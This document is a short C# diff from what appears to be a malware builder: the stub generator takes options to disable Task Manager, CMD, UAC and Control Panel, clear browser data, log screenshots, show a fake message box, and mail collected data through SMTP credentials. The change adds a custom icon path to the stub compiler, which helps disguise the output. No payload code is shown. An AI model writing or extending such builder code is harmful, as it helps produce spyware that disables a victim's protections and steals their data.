@@ -8,7 +8,7 @@ namespace UnknownLibrary.Stub
             bool SilentSiteVisitorbool, bool ClearChromeAndFireFoxDatabool, bool DisableTaskManagerbool, bool DisableCMDbool, bool DisableUACbool,
             bool DisableControlPanelbool, bool LogScreenshotbool, bool FakeMessageBoxbool,
             string MessageBoxNamestring, string MessageBoxTextstring, string MessageBoxOptionstring, string MessageBoxIconstring, string MailTostring, string MailFromstring,
-            string MailPasswordstring, int SendIntervalint, string SMTPServer, string SMTPPort)
+            string MailPasswordstring, int SendIntervalint, string SMTPServer, string SMTPPort, string icoLocation)
         {
 
             #region VariableInitializer
@@ -28,7 +28,7 @@ namespace UnknownLibrary.Stub
             #endregion
 
             var References = new[] { "System.dll", "System.Windows.Forms.dll", "UnknownLibrary.dll", "Microsoft.CSharp.dll", @"C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.5.2\WindowsBase.dll" };
-            var Results = CreateStub.CompileStub(Hidebool.ToString().ToLower() ,new[] { SourceCode  ,AssemblyInformation, Variables },  ApplicationTitle, References);
+            var Results = CreateStub.CompileStub(Hidebool.ToString().ToLower() ,new[] { SourceCode  ,AssemblyInformation,  Variables },  ApplicationTitle, icoLocation, References);
             
             if(Results.Errors.Count == 0)
             {
